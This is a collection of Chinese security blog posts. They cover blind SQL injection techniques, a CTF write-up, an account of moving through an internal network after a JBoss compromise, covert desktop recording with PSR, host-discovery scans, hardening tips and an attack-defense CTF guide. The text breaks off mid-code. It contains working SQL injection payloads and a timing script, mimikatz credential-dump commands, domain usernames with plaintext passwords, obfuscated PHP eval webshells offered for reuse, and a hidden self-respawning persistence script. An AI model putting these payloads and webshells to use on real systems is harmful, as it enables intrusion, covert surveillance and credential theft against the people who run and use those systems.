大致思想：1、mid为left和right的中间值，mid是否和left相等（right-left=1），相等跳到5，如果不等跳到22、请求mid，如果返回正确的页面跳到3，如果返回错误的页面跳到43、返回页面正确，将left赋值为mid4、返回页面错误，将right赋值为mid5、返回mid值 二分法它的原理是把可能出现的字符看做一个有序的序列，这样在查找所要查找的元素时,首先与序列中间的元素进行比较,如果大于这个元素,就在当前序列的后半部分继续查找,如果小于这个元素,就在当前序列的前半部分继续查找,直到找到相同的元素,或者所查找的序列范围为空为止。 如果需要查找数据表和数据表的内容，在getAllSchemaNames()添加个where语句 时间的SQL盲注延时注入是主要针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术。 延迟注入主要点是在于if()函数的判断、1if(condition,true,false) //条件语句 condition 是判断条件 true 和false 是符合condition自定义的返回结果。 本地测试感受一下1234567891011121314151617181920212223mysql&gt; select ascii(mid(database(),1,1));+----------------------------+| ascii(mid(database(),1,1)) |+----------------------------+| 115 |+----------------------------+1 row in set (0.00 sec)mysql&gt; select if(ascii(mid(database(),1,1))=115,sleep(5),1);+-----------------------------------------------+| if(ascii(mid(database(),1,1))=115,sleep(5),1) |+-----------------------------------------------+| 0 |+-----------------------------------------------+1 row in set (5.01 sec) mysql&gt; select if(ascii(mid(database(),1,1))=114,sleep(5),1);+-----------------------------------------------+| if(ascii(mid(database(),1,1))=114,sleep(5),1) |+-----------------------------------------------+| 1 |+-----------------------------------------------+1 row in set (0.00 sec) 如果condition判断为正确，则产生延迟，否则不产生延迟。至于脚本，修改下上面的脚本进行判断即可。123456789101112url = "http://192.168.2.100/sqli-labs/Less-9/?id="esndStr = " and sleep(3))--+"payload = "1' and ((ascii(mid((select " + column_name + " from " + database_name + "." + table_name + " limit " + Result + ",1)," + Char + ",1))&gt;" + mid + ")"tempurl = url + payload + esndStrbefore_time = time.time()requests.head(tempurl)after_time = time.time()use_time = after_time - before_timeif abs(use_time) &lt; 0.1: return Trueelse: return False 报错的SQL盲注如果页面上显示数据的报错信息，那么可以直接使用报错的方式把想要的信息爆出来。 比如在mysql中我们可以使用如下的经典语句进行报错。1select 1,2 union select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x; 这是网上流传很广的一个版本，可以简化成如下的形式。1select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) 如果关键的表被禁用了，可以使用这种形式1select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2)) 如果rand被禁用了可以使用用户变量来报错1select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2) 其实这是mysql的一个bug所引起的，其他数据库都不会因为这个问题而报错。 另外，在mysql5.1版本新加入两个xml函数，也可以用来报错。1234mysql&gt; select * from article where id = 1 and extractvalue(1, concat(0x5c,(select pass from admin limit 1)));ERROR 1105 (HY000): XPATH syntax error: '\admin888' mysql&gt; select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,(select pass from admin limit 1),0x5e24),1)); ERROR 1105 (HY000): XPATH syntax error: '^$admin888^$' 而在其他数据库中也可以使用不同的方法构成报错12345PostgreSQL: /?param=1 and(1)=cast(version() as numeric)-- MSSQL: /?param=1 and(1)=convert(int,@@version)-- Sybase: /?param=1 and(1)=convert(int,@@version)-- Oracle &gt;=9.0: /?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)-- 参考：详解SQL盲注测试高级技巧MYSQL注入天书之盲注讲解]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>知识回顾</tag>
        <tag>数据库</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【CTF】平衡信息杯-Write-Up]]></title>
    <url>%2F2017%2F10%2F%E3%80%90CTF%E3%80%91%E5%B9%B3%E8%A1%A1%E4%BF%A1%E6%81%AF%E6%9D%AF-Write-Up%2F</url>
    <content type="text"><![CDATA[【CTF】平衡信息杯-Write-Up BasicBasic_100-神秘二进制这二进制莫名其妙，因为没人能做出，所以就改题了。 Basic_100_2-Finally, You get flag!附件是一个base64的加密,只要解密就可以看到flag Basic_200这道题怎么说呢，看图就知道了。 WebWeb_100附件的代码为：123&lt;script&gt;eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?"":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return'\\w+'&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;&#125;('2 c=E;g m()&#123;2 8=p.q;2 6=l j();f(8.w("?")!=-1)&#123;2 h=8.r(1);5=h.9("&amp;");d(2 i=0;i&lt;5.o;i++)&#123;6[5[i].9("=")[0]]=u(5[i].9("=")[1])&#125;&#125;v 6&#125;g n(4,s,e)&#123;7="";d(i=0;i&lt;4.o;i++)&#123;k=(s+e)%c;t=e;e=s+e;s=t;7+=4[i]^k&#125;f(7=="x")b.a("C\'s z!");B b.a("A\'s y!")&#125;2 3=l j();3=m();b.a(3);n(3[\'4\'],F,D);',42,42,'||var|Request|key|strs|theRequest|cipher|url|split|log|console|iv|for||if|function|str||Object||new|GetRequest|enc|length|location|search|substr|||unescape|return|indexOf|34558914423312210022264341011282361161032135513678115123012499|Wrong|Right|Something|else|That|21|0xff|13'.split('|'),0,&#123;&#125;))&lt;/script&gt; 用http://jsbeautifier.org/进行解密之后为：1234567891011121314151617181920212223242526272829var iv = 0xff;function GetRequest() &#123; var url = location.search; var theRequest = new Object(); if (url.indexOf("?") != -1) &#123; var str = url.substr(1); strs = str.split("&amp;"); for (var i = 0; i &lt; strs.length; i++) &#123; theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]) &#125; &#125; return theRequest&#125;function enc(key, s, e) &#123; cipher = ""; for (i = 0; i &lt; key.length; i++) &#123; k = (s + e) % iv; t = e; e = s + e; s = t; cipher += key[i] ^ k &#125; if (cipher == "34558914423312210022264341011282361161032135513678115123012499") console.log("That's Right!"); else console.log("Something's Wrong!")&#125;var Request = new Object();Request = GetRequest();console.log(Request);enc(Request['key'], 13, 21); 反推12345678910function enc(key, s, e) &#123; cipher = ""; for (i = 0; i &lt; key.length; i++) &#123; k = (s + e) % iv; t = e; e = s + e; s = t; cipher += key[i] ^ k &#125; if (cipher == "34558914423312210022264341011282361161032135513678115123012499") console.log("That's Right!"); 得出key为000000003007006000702000结合function GetRequest得出payload为1?key=000000003007006000702000 但是提交结果不对。过了大半天，但是一个人都没解出来，官方给出hintemmmmm，这题就这样吧，看不懂。果然100分。 Web_200转啊转，转啊转，信息收集。 这个input、这个URL格式，不正是今年NodeJS RCE 参考了这个利用 Node.js 反序列化漏洞远程执行代码但是没成功，弹不了shell的，群里说，直接读直接读。但是我没能直接读出来，得把结果扔到vps上。payload出自于如何使用NodeJS写出一枚远程命令执行(RCE）漏洞 Web_300直接sqlmap就行了。1234567891011121314sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=8 AND 4897=4897 Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=8 AND SLEEP(5)---[13:39:29] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL &gt;= 5.0.12 MiscMisc_200_2这题一直在踩内部doc的坑。 Misc_300先用脚本提取Pcapng中的菜刀流量，这题最大的坑就是数据包有点大大大大大大了。看到了ProcDump很关键，这道题可能就是利用了ProcDump+mimikatz的组合，毕竟毕竟这样免杀。先导出http，找到了关键点（其实dump的结果都不小），辣鸡数据包、辣鸡电脑，卡到生活不能自理。规则为frame.len == 533,追踪流确实看到关键字将数据抠出来，使用mimikatz进行恢复，但是恢复过程中还是出现不少问题，抠出来的数据恢复不了，mimikatz没注意是32还是64等等。。。123mimikatz.exesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full MobileAndroid_crackme1先用jadx反编译apk就一个控件。往下看，了解这个程序的主要思想：输入的Password值，经过CryptClass后，得到的加密结果是否匹配cip，正确就输出Bingo。重点查看123String enc = CryptClass.encrypt_str(passstr, (String) keys.get(passstr.length() % keys.size()));if (enc.equals(MainActivity.this.cip)) &#123; Toast.makeText(MainActivity.this, "Bingo!", 1).show(); 首先还是得去弄明白它们的值是怎么来的。 看到R.string.key6，然后去找这个key6，但是找到的是1public static final int key6 = 2131165222; 有安卓开发的人都知道，编写java代码中的常量在一般情况下，我们是定义在string.xml这个文件中，这个string.xml的值会被R文件映射。123this.Password = (EditText) findViewById(R.id.editText5);this.Cipher = (EditText) findViewById(R.id.editText6);this.cip = getString(R.string.key6); Password值是编辑框接受输入的值，为后续的passstrCipher值不知道干啥cip值为05bfed10af08193ff0b218e887c53dfa162f8a6e8bpassstr.length() % keys.size()的理论值为0,1,2,3,4,5，主要看passstr的长度，因为是passstr的长度决定了调用哪一个keys验证得出passstr的长度以及keys值这样我们就可以得出passstr的长度为21，使用的keys为3，也就是NO1bgoMn14J85yrLQHM9KoZJ 接下来，就看看怎么解密了。看了下，我选择了爆破的方式。在验证passstr的长度以及keys值的时候，发现输入的password值个数是21个，加密后个数变为42，也就是说1个字符加密得出2个字符。那我们就将cip拆开进行每位数的验证顺便说一句，上图不应该是解密，应为加密，还有就是Eclipse的调试不够人性化。拆开验证是： 看了各位大佬的wp，才发现，CryptClass类里面是有解密函数的。 ReVwindows_crackme2菜鸡总是看哪些题是多人解出来之后就去做哪题。扔进ILSpy没看到源码，扔进Reflector拿到源码。Form1的内容为机器码12345public Form1()&#123; this.InitializeComponent(); this.textBox1.Text = "SzLPCCA4";&#125; 我们要找出相应的注册码，先看源码。12345678910111213141516171819202122232425262728293031323334353637private void button1_Click(object sender, EventArgs e)&#123; string text = this.textBox2.Text; //注册码框 SHA1 sha = new SHA1CryptoServiceProvider(); //Sha1编码 byte[] bytes = Encoding.Unicode.GetBytes(this.textBox1.Text); string str2 = BitConverter.ToString(sha.ComputeHash(bytes)); //对SzLPCCA4进行Sha1编码 string str3 = new string(text.ToCharArray().Reverse&lt;char&gt;().ToArray&lt;char&gt;()); //对输入的注册码进行反转 string str4 = ""; int num = 0; for (int i = 0; i &lt; str3.Length; i++) &#123; if (text[i] != '-') &#123; num++; str4 = str4 + str3[i].ToString(); if (num == 2) &#123; num = 0; if (i != (str3.Length - 1)) &#123; str4 = str4 + "-"; &#125; &#125; &#125; &#125; string str5 = AESEncrypt(str2, "H8vY7QKY", "8@Z&gt;FXsv"); //对sha1编码后的SzLPCCA4进行AES加密 string str6 = AESEncrypt(str4, "H8vY7QKY", "8@Z&gt;FXsv"); //对反转后的注册码进行AES加密 if (str5 == str6) &#123; MessageBox.Show("再来一瓶!"); &#125; else &#123; MessageBox.Show("谢谢参与!"); &#125;&#125; 主体的思想为： 机器码：Sha1编码后再进行AES加密的值为str5注册码：反转后再进行AES加密的值为str6如果str5等于str6则返回再来一瓶，flag则为输入的注册码 解题思路： AES加密的密钥都是一样的，所以加密前是相等的。只要将机器码进行Sha1编码后再反转就是注册码也就是将str2进行输出后反转或者反转后输出 demo为：1234567public static void Main(string() args)&#123; SHA1 sha = new SHA1CryptoServiceProvider(); byte[] bytes = Encoding.Unicode.GetBytes("SzLPCCA4"); string str2 = BitConverter.ToString(sha.ComputeHash(bytes)); MessageBox.Show(str2);&#125; 得到的结果为0AC8B571539392065B0B160148832CA2DC2710A1,进行反转且八位每段得出flag。1A0172CD-2AC23884-1061B0B5-60293935-175B8CA0 最后附张图：]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【测试评估】Jboss引起的内网渗透 - 1]]></title>
    <url>%2F2017%2F10%2F%E3%80%90%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0%E3%80%91Jboss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%20-%201%2F</url>
    <content type="text"><![CDATA[待人如知己切入点为Jboss反序列化，就不多说了，远程部署war。war中包含了 1shell、reGeorg、https.exe 使用https.exe反弹一个msf的shell，不多说，上远控巩固权限。 P·S：图片是后面补上的 信息收集查看进程信息是否有杀软看了一轮没有什么主流的杀软MsMpEng.exe是属于Windows Defender 自动保护服务的核心进程。 12345systeminfoipconfig /allnet viewpingnet time /domain 综合以上信息ipconfig /all的信息，DNS suffix search list是xxx.com,nds服务器是xx.18,备份nds服务器为xx.19。net time /domain 指向的是xx.17的机器，ping xxx.com指向xx.18(第二天ping xxx.com结果为xx.17)，到第三天再看，又发现是xx.18的。得到的结果： 192.168.1.17 为域控192.168.1.18和192.168.1.19为DNS服务器，不确定是否为域控 不确定的话就下一步确认、12net group "domain admins" /domain #查看域管理员net group "domain controllers" /domain #查看域控制器 结果为：那就可以明确xx.17，xx.18，xx.19为域控制器 小小免杀因为是存在着MsMpEng.exe，所以如果不做一些免杀的话，是会被杀掉的。使用Cobalt Strike生成一个exe和bin文件，将两者进行混淆，最后生成一个新的exe 横向渗透由于是Jboss反序列化为入口(正常不存在提权情况)，在控制台处可以看到类似日志的IP记录，发现了内网还有个172.18.19.10的IP，所以判断还有这么一个段的存在。进到机器上面却没有看到有链接 = = 组策略漏洞（GPP）12net use e: \\192.168.1.17\\sysvol（三台）dir /s groups.xml 找不到groups.xml，这条路不通。 MS17-010先着手用MS17-010打一轮，打一轮再说。留着后面没思路的时候抓密码用。12345678910MS17-010 FCE-3212：192.168.1.92 Windows 7 Professional 7601 SP 1 FCE-3235：192.168.1.126 Windows 7 Professional 7601 SP 1 FCE-PLOT：192.168.1.217 Windows xp [!] Target could be either SP2 or SP3 *** *** *** MS14-068 KERBEROS漏洞之前也没怎么用过这个漏洞。要测试这个漏洞，前提还是要明白kerberos的整个认证协议过程，不然是不会明白原理的，测试过程中出了什么问题也不知道怎么解决。利用这个漏洞，我们需要一个普通域用户的账户名和密码或者是哈希，哈希传递我已经在别的文章中总结了，其实哈希和密码是有相同的效果。以及域名称，该用户的 sids。 而我们在信息收集的时候，已经将靶机上的域用户账号密码抓取,但是我们不知道域控上面是否存在这个漏洞。经过一轮测试，发现MS14-068失败。 抓密码靶机上抓不到域管，那就去别的机器去抓。先将有MS17-010的抓一轮，幸运的话，就直接可以了。12345678FCE-3212：192.168.1.92 Windows 7 Professional 7601 SP 1 * Username : jduffy * Password : papap111FCE-UTIL：192.168.1.230 Windows 7 Professional 7601 SP 1 * Username : ComputerRoom * Password : papap duang的一样，很幸运，在第二台的时候就发现有域管了。附张图 我在dumn密码的时候发现一个很奇怪的问题，我打的是192.168.1.244，但是返回来的结果是192.168.1.37的结果，所以我去看了ipconfig /all我就懵了，这不知道是啥情况。 如果MS17-010行不通的话就开始找漏洞配置不当以获取更多主机权限，然后再继续抓密码。这些在之前的文章是总结过的。 擦干屁股开溜了，至于内网的广度和深度就不做研究了。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>测试评估</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透技巧】巧妙利用win自带的-PSR-实现监控Windows桌面]]></title>
    <url>%2F2017%2F09%2F%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8win%E8%87%AA%E5%B8%A6%E7%9A%84-PSR-%E5%AE%9E%E7%8E%B0%E7%9B%91%E6%8E%A7Windows%E6%A1%8C%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[PSR 即win自带的”问题步骤记录器”,也就是说它会捕捉活动窗口。这还是在课上无聊翻到的一个东西，用在屏幕截图上也是有很好的效果，因为是Windows系统自带的，所以不用考虑免杀问题。 唯一的限制：要求系统是 windows 7之后，也就是在做个人机的时候可以使用，不排除个别的情况。之前不知道有命令行的方法，直到看了三好学生的paper（这段时间一直在啃）。 进阶直接查看进阶只用方法。123456789101112131415161718psr.exe [/start |/stop][/output &lt;fullfilepath&gt;] [/sc (0|1)] [/maxsc &lt;value&gt;][/sketch (0|1)] [/slides (0|1)] [/gui (0|1)][/arcetl (0|1)] [/arcxml (0|1)] [/arcmht (0|1)][/stopevent &lt;eventname&gt;] [/maxlogsize &lt;value&gt;] [/recordpid &lt;pid&gt;]/start 开始录制，需要指定文件保存路径/stop 停止录制 /sc 捕捉记录步骤的截图，0|1/maxsc 最大的截图数量/maxlogsize 最大日志文件大小(MB)/gui 是否显示psr的界面，0|1 /arcetl Include raw ETW file in archive output./arcxml Include MHT file in archive output./recordpid Record all actions associated with given PID./sketch Sketch UI if no screenshot was saved./slides Create slide show HTML pages./output 保存的输出路径/stopevent Event to signal after output files are generated. 示例：123456psr.exe /start /gui 0 /output C:\windows\temp\capture.zip 后台启动psr并开始录制，文件保存为C:\windows\temp\capture.zipStart-Sleep -s 10; 等待10s，即录制时间为10spsr.exe /stop; 结束录制，自动退出 压缩包内是mht格式,直接用IE打开就好。效果为： 防御 小结利用PSR监控Windows桌面，不仅仅能够捕获用户桌面的操作，而且在报告中会包含更多有用的细节信息，相信你在渗透测试的过程中，bat+定时任务，一定会用上它。 【参考】渗透技巧——如何巧妙利用PSR监控Windows桌面]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>渗透技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【内网必修】存活扫描]]></title>
    <url>%2F2017%2F08%2F%E3%80%90%E5%86%85%E7%BD%91%E5%BF%85%E4%BF%AE%E3%80%91%E5%AD%98%E6%B4%BB%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[咦！使人觉得遥远的不是时间长，而是两三件不可挽回的事。 icmp扫描基于icmp的各种内网主机发现方式，如果防火墙过滤的icmp请求，这种方式基本就废了，但是基本上都不会过滤icmp协议的请求。除了本身自带的命令，也可以考虑使用第三方程序，比如cping。 在win下使用icmp扫描 cmd中执行如下命令，对整个C段进行ping扫描 1for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i "ttl" 利用powershell对目标内网进行icmp扫描 123powershell.exe -exec bypass -Command "Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000" # 目标网段，并非仅限C段，比如你也可以写成这种方式`192.168.3.1 - 192.168.31.254` 在linux下使用各类icmp扫描 最简单的方式,将下面的代码保存至shell中,赋予其执行权限,执行该脚本即可 1234567891011#!/bin/bashfor ip in 192.168.1.&#123;1..254&#125; do ping $ip -c 1 &amp;&gt; /dev/null if [ $? -eq 0 ];then echo $ip is alive .... fi done或者for i in 192.168.4.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i is alived; fi; done nmap的icmp扫描 1nmap -sn -PE 192.168.1.0/24 arp扫描在win下使用各种arp扫描123start /b arpscan.exe -t 192.168.1.0/24 &gt;&gt; result.txtpowershell.exe -exec bypass -Command "Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24" &gt;&gt; result.txt 在 linux 下使用 arp 扫描1234567891011# wget https://nmap.org/dist/nmap-7.40.tar.bz2# bzip2 -cd nmap-7.40.tar.bz2 | tar xvf -# cd nmap-7.40 # ./configure 这里可以用--prefix指定安装路径# echo $?# make# make install# echo $?# make install# echo $? # nmap -sn -PR 192.168.1.0/24 尝试arp扫描 处在别人的vpn内网(kali) 123456789101112netdiscover -r 192.168.1.0/24 -i eth0msf的arp扫描模块msf &gt; use auxiliary/scanner/discovery/arp_sweepmsf &gt; show optionsmsf &gt; set interface eth0msf &gt; set smac 00:0c:29:92:fd:85msf &gt; set rhosts 192.168.1.0/24msf &gt; set threads 20msf &gt; set shost 192.168.1.27msf &gt; run meterpreter 123meterpreter &gt; getsystem 另外,在目标机器上扫描时,务必先提权(个人建议,会方便很多),不然扫描过程中可能会有些问题meterpreter &gt; run autoroute -s 192.168.1.0/24meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24 基于smb和netbios的内网主机发现方式win下:1nbtscan.exe -m 192.168.1.0/24 非常经典的小工具 linux下:123456wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgztar -zxvf nbtscan-source-1.0.35.tgzmakeecho $?./nbtscan -h./nbtscan -m 192.168.1.0/24 域内扫描12net viewdsquery computer 其实,域内最好用的也就是nbtscan了 Ps:如果计算机名很多的时候，可以利用bat批量ping获取ip1234567@echo offsetlocal ENABLEDELAYEDEXPANSION@FOR /F "usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "命令成功完成" /v ^|find "The command completed successfully." /v`) DO (@FOR /F "usebackq delims=" %%i IN (`@ping -n 1 -4 %%j ^| findstr "Pinging"`) DO (@FOR /F "usebackq tokens=2 delims=[]" %%k IN (`echo %%i`) DO (echo %%k %%j)))]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网必修</tag>
        <tag>系统安全</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【内网必修】安全鸡]]></title>
    <url>%2F2017%2F07%2F%E3%80%90%E5%86%85%E7%BD%91%E5%BF%85%E4%BF%AE%E3%80%91%E5%AE%89%E5%85%A8%E9%B8%A1%2F</url>
    <content type="text"><![CDATA[在日常的工作生活中，如何打造一个相对安全的环境，这是值得思考及解决的问题。 0x00 前言从事安全行业或者喜欢研究安全技术的人员，建议如下搭建环境。 两张网卡两条不同线路（可多）； 统一使用英文系统； 物理机脱网，设置加密盘； 不同虚拟机设置不同线路（ 日常上网一条，日常工作一条）； 编程机器不要带入个人 ID； 工作机不安装任何带有母语信息的软件； 所有机器补丁打满； 虚拟机关机即还原； 略…. 以下如无特殊说明，均为 Windows 7虚拟环境，详细情况如下。 0x01 个人电脑1) 时间同步通常为了得到更加精确的时间信息，我们会采用将 Windows 时间与网络时间进行同步操作来实现。但是如果在被反日的过程中发现使用了时间同步功能，那基本就可以确定所在地区，所以为了更友好，就需要关闭这项功能。 点击桌面右下角时间，然后在弹出的窗口中点击更改日期和时间设置 在出现的窗口上部的选项选择Internet 时间 接下来选择更改设置 去除与 Internet 时间同步，再点击确定就行了。 2) win7关闭同步中心 Win+R – regedit 打开注册表 在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Syncmgr\Handlers项中找到一个与SQL Server 2000 相关的分支 删除它，这时任务栏里的同步中心图标应该会消失，重启以后同步中心也不会自动启动了。 当然，如果你有其它同步项，比如没有禁用离线文件，或者有移动设备同步，都有可能使同步中心自动启动。 3) update大多数朋友可能会遇上 Win 7 系统关机时出现自动更新延长关机时间，导致有急事无法快速关机拔电源。但要说的不是这回事，仔细了解 update 背后的故事，都懂得。同时调出本地组策略编辑器 Win+R – gpedit.msc 打开组策略编辑器 找到管理模板 /Windows 组件 找到 Windows Update，开启那啥。 4) 打印机 在控制面板中的管理工具中找到服务 在其中找到 Print Spooler 将服务停掉也可以直接在命令行下执行 net stop spooler 5) 摄像头最保险的办法的就是直接禁用摄像头的驱动了。 右击电脑桌面上的“计算机”图标选择“属性”选项; 设备管理器 图像设备，找到我们笔记本内置的摄像头 直接右击禁用即可 6) 麦克风关闭方法： 首先在电脑桌面右下角任务栏上的声音图标上右键，然后选择“录音设备”。 之后在弹出的声音属性对话框，将鼠标放在“麦克风”上右键选择“禁用”即可（或点击属性进行选择）。 这样我们就简单禁用了录音设备麦克风了，不影响声卡，依然可以正常播放音乐，只是不能再录音以及语音说话了。 7) USB自动读取禁止 usb 设备的自动运行，首先是出于安全考虑，再者按需运行，减少不必要的程序开启。 8) 小娜（windows 10）使用毛豆就可以。 0x02 个人意识1) 安全上网不在工作机上登陆私人账户 2) 密码分级很多人各网站用户名密码相同，这样黑客用被泄露网站的密码登录其他网站很有可能会成功，每个网站都设置不同的密码可能不现实，那就可以对密码就行分级管理。 3) 文件删除如果是平时的删除则使用强制删除，Shift+del。电脑出售或者移交其他人使用，删除敏感文件后，同样需要对硬盘脱密，使用脱密工具反复擦写5次以上。 4) 文件加密存储Windows 的话本身的 BitLocker 就很不错。个人使用 TrueCrypt ，文件直接放在硬盘上，电脑丢失后硬盘上文件就可以被直接读取，如果存到加密盘中，拿到硬盘后必须输入加密盘密码加载加密盘才能看到其中的文件，就有效避免了重要文件泄密。 5) 软件下载最好是到该软件官网下载，校验MD5值，避免出现捆马现象。校验方法：1certutil -hashfile 文件名 MD5 6) 软件更新弹出更新框，关掉，去官网下载新版进行安装。 7) 数据备份 个人电脑上的重要数据要定期备份到服务器或移动硬盘 备份时注意数据要加密，建议使用加密盘，备份整个加密盘原始文件 8) 邮箱工作邮箱文件及时删除（前提是备份好文件） 9) 桌面安全同事之间工作内容、工作性质不同，有权知晓的信息内容、信息密级也有所不同。离开电脑时记得锁屏，快捷键为Win+L桌面文件不可以存在敏感文件，敏感文件需要放在加密盘 0x03 网络物理机脱网处理，虚拟机使用桥接模式，接入不同网卡 –&gt; 网线。 加密盘放在物理机内，整盘加密或者部分文件加密都是选择对象。 文本文件处理都在隔断网络的物理机上，毕竟各种钓鱼。 1) WIFI安全只能说，不是自己的WIFI就不要连接，毕竟、毕竟、毕竟只要是 WIFI 名字相同就能随意连接的年代，有点慌。建议： 日常不用 WIFI 时关闭手机和笔记本的无线局域网功能，以防止自动连接恶意 WIFI ； 当手机或笔记本连接上 WIFI 后，留意连接到的 WIFI 热点名称 3) 强制通过VPN上网,VPN断线就断网部分工作机是需要这样的机制，至于为什么，嗯。 https://www.t00ls.net/thread-38739-1-1.htmlhttps://www.t00ls.net/viewthread.php?tid=38860&amp;extra=&amp;page=1 待续…]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>内网必修</tag>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【CTF】CTF线下攻防赛总结]]></title>
    <url>%2F2017%2F06%2F%E3%80%90CTF%E3%80%91CTF%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[本着最后一次参加线下赛，这时间安排也是让人很无语。将这一份总结留给学弟他们，涨涨经验。 一张常规的CTF线下攻防思维导图 SSH登陆两三个人进行分工，一个粗略的看下web，有登陆口的话，就需要修改密码，将情况反馈给队友，让登陆ssh的小伙伴进行密码的修改，改成炒鸡复杂、然后将Web目录下载下来，上WAF、文件监控、端口扫描。将这几个工作分工好，顺序就像图上。 tips：将下载下来的Web目录理一遍，看是否有可疑的文件夹，比如bak。依然记得有次比赛，有两台靶机，赛组提示弱口令。然后每一支队伍都奔着后台去了，结果有队伍在Web目录下发现了这个bak目录，打开发现是phpmyadmin，提示的弱口令是在这里用上。 网络拓扑首先先理清好网络拓扑关系，节点与各链路之间的关联。这个需要下一步配合，要不然不知道对手在哪就GG。示例： 主机发现如果是在同个C段，或者B段，均可以使用RouterScan进行对80端口扫描进行扫描得出，嫌麻烦的话，就用httpscan这个小巧的脚本 千万要记得扫端口，这很重要。用nmap也行，自己写的脚本或者网上找的也行。 预留后门有的比赛环境，为了照顾比较菜的选手（此处举手），预留了一句话后门。将整个web目录下载到本地，使用hm.exe、D盾或者别的扫描工具可以扫描得出（如果预留） 黑盒测试 防御及修复建议1.将所有的登陆口密码进行修改（炒鸡复杂）；2.将上传页面的action地址修改为*，（机智小能手！！）；3.反序列化和命令执行，就去seebug或其他的站点找补丁；4.待补充… 一句话控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。简单举例：1&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt; 连接方式：php?2=assert密码是1。献上我常用得一句话12345678&lt;?php$a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e='($_REQUEST[C])';@assert($a.$b.$c.$d.$e);?&gt; 配置为?b=))99(rhC(tseuqeR+lave 123&lt;?php $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;['n985de9'];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=连接密码:0（零） 权限维持1234567891011121314&lt;?php set_time_limit(0); ignore_user_abort(true); $file = '.demo.php'; $shell = "&lt;?php phpinfo();?&gt;"; while(true)&#123; file_put_contents($file, $shell); system('chmod 777 .demo.php'); usleep(50); &#125;?&gt; tips:.demo.php前面使用一个点，能很好的隐藏文件。想要结束这个进程，除了最暴力的重启服务之外，更为优雅的如下:1234567&lt;?phpwhile (1) &#123; $pid=1234; @unlink('demo.php'); exec('kill -9 $pid');&#125;?&gt; 先查看进程，查看对应的pid，再执行即可。 素质低的人则会放置一个md5马，比如1234&lt;?phpif(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253')@eval($_POST['cmd']);?&gt; 如果素质低的人又很猥琐，像rootrain这种就是。那就是利用header，最后综合起来就是12345678&lt;?phpecho 